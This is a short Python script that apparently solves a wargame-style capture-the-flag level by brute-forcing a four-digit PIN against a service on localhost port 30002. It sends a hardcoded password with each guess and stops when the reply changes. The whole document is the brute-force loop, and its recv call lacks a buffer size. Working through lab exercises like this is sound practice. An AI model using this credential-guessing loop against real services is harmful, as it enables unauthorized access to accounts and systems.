import socket
password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ "
pin = 0 
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('localhost',30002))
s.recv(1024)
while True:
	print str(pin)
	s.sendall(password+str(pin)+"\n")
	data = s.recv()
	if(data != "Fail! You did not supply enough data. Try again."):
		print data
		break;

	pin += 1
